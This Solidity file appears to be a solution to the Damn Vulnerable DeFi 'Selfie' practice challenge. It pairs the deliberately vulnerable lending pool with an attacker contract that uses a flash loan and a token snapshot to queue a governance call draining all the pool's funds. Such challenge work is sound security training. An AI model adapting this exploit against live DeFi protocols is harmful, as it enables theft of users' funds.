// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";
/**
 * @title SelfiePool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SelfiePool is ReentrancyGuard, IERC3156FlashLender {
    ERC20Snapshot public immutable token;
    SimpleGovernance public immutable governance;
    bytes32 private constant CALLBACK_SUCCESS =
        keccak256("ERC3156FlashBorrower.onFlashLoan");

    error RepayFailed();
    error CallerNotGovernance();
    error UnsupportedCurrency();
    error CallbackFailed();

    event FundsDrained(address indexed receiver, uint256 amount);

    modifier onlyGovernance() {
        if (msg.sender != address(governance)) revert CallerNotGovernance();
        _;
    }

    constructor(address _token, address _governance) {
        token = ERC20Snapshot(_token);
        governance = SimpleGovernance(_governance);
    }

    function maxFlashLoan(address _token) external view returns (uint256) {
        if (address(token) == _token) return token.balanceOf(address(this));
        return 0;
    }

    function flashFee(address _token, uint256) external view returns (uint256) {
        if (address(token) != _token) revert UnsupportedCurrency();
        return 0;
    }

    function flashLoan(
        IERC3156FlashBorrower _receiver,
        address _token,
        uint256 _amount,
        bytes calldata _data
    ) external nonReentrant returns (bool) {
        if (_token != address(token)) revert UnsupportedCurrency();

        token.transfer(address(_receiver), _amount);
        if (
            _receiver.onFlashLoan(msg.sender, _token, _amount, 0, _data) !=
            CALLBACK_SUCCESS
        ) revert CallbackFailed();

        if (!token.transferFrom(address(_receiver), address(this), _amount))
            revert RepayFailed();

        return true;
    }
    //@audit if governance gets compromised, this is a single point of failure
    function emergencyExit(address receiver) external onlyGovernance {
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);

        emit FundsDrained(receiver, amount);
    }
}

contract SelfieFlashLoanReceiver is IERC3156FlashBorrower {
    SelfiePool public immutable i_pool;
    DamnValuableTokenSnapshot public immutable i_token;
    SimpleGovernance public immutable i_governance;
    address public immutable i_receiver;
    bytes32 private constant CALLBACK_SUCCESS =
        keccak256("ERC3156FlashBorrower.onFlashLoan");
    constructor(
        address _pool,
        address _token,
        SimpleGovernance _governance,
        address _receiver
    ) {
        i_pool = SelfiePool(_pool);
        i_token = DamnValuableTokenSnapshot(_token);
        i_governance = _governance;
        i_receiver = _receiver;
    }
    function executeFlashLoan() external {
        i_pool.flashLoan(
            this,
            address(i_token),
            i_pool.maxFlashLoan(address(i_token)),
            ""
        );
    }
    function onFlashLoan(
        address,
        address,
        uint256 _amount,
        uint256,
        bytes calldata
    ) external override returns (bytes32) {
        DamnValuableTokenSnapshot(i_token).snapshot();
        i_governance.queueAction(
            address(i_pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", i_receiver)
        );

        i_token.approve(address(i_pool), _amount);
        return CALLBACK_SUCCESS;
    }
}
